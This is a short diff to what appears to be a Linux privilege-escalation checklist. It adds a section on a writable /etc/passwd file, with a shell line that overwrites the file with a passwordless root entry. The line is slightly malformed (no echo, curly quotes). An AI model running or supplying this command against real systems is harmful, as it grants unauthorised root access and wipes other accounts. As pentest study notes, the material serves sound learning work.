@@ -43,3 +43,8 @@ Any hardcoded credentials? Where are credentials kept?
 ```
 https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
 ```
+
+## Writable /etc/passwd file found
+```
+“root::0:0:root:/root:/bin/bash” > /etc/passwd
+```
